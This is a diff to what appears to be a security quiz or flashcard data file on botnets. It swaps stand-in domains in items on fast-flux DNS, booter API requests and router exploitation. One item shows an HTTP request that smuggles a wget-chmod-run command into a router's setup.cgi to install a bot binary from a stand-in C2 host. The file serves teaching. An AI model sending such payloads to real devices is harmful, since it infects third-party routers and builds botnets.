@@ -57,12 +57,12 @@ def generate_dga_domains(seed_date):
   {
     question: "What is 'Fast-Flux DNS', and how do Botnets use Rapid TTL Expirations to Hide C2 Servers?",
     shortAnswer: "Constantly changing the IP addresses associated with a single C2 domain name in DNS every few minutes with ultra-short TTLs (e.g. 60 seconds), routing traffic through an ever-shifting pool of compromised proxy bots.",
-    explanation: "In Single-Flux DNS, the `A` record for `c2.evil-botnet.in` points to 50 different infected residential IP addresses, changing every 60 seconds. In Double-Flux DNS, both the `A` records and the Authoritative Name Server (`NS`) records flux continuously. When security researchers try to trace or block the C2 IP, the domain is already pointing to 50 completely new IP addresses in another country.",
+    explanation: "In Single-Flux DNS, the `A` record for `attacker-c2.net` points to 50 different infected residential IP addresses, changing every 60 seconds. In Double-Flux DNS, both the `A` records and the Authoritative Name Server (`NS`) records flux continuously. When security researchers try to trace or block the C2 IP, the domain is already pointing to 50 completely new IP addresses in another country.",
     hint: "A criminal changing disguises and switching rental cars every 60 seconds to evade police tracking.",
     level: "expert",
     codeExample: `// Fast-Flux DNS Record Query (TTL = 60 Seconds):
-// Minute 01: c2.evil.in ➔ 185.220.101.5, 103.25.10.8, 198.51.100.4
-// Minute 02: c2.evil.in ➔ 45.33.32.156, 172.56.21.90, 82.102.23.4
+// Minute 01: attacker-c2.net ➔ 185.220.101.5, 103.25.10.8, 198.51.100.4
+// Minute 02: attacker-c2.net ➔ 45.33.32.156, 172.56.21.90, 82.102.23.4
 // Result: Static firewall IP blocking is completely rendered useless!`
   },
   {
@@ -156,7 +156,7 @@ flow-route {
     hint: "Renting a massive wrecking ball with a credit card to smash a building with one click.",
     level: "basic",
     codeExample: `// Booter / Stresser API Attack Request:
-POST https://stresser-c2.evil-hub.in/api/v1/attack
+POST https://stresser-attacker-c2.net/api/v1/attack
 {
     "target": "103.25.10.50",
     "port": 443,
@@ -233,7 +233,7 @@ POST /setup.cgi?next_file=netcore_get.ccp HTTP/1.1
 Host: 103.25.10.50
 Content-Type: application/x-www-form-urlencoded
 
-cmd=wget http://c2.evil-botnet.in/bot.arm -O /tmp/b && chmod +x /tmp/b && /tmp/b
+cmd=wget http://attacker-c2.net/bot.arm -O /tmp/b && chmod +x /tmp/b && /tmp/b
 # Result: Router infected and converted into active botnet zombie in 2 seconds!`
   },
   {
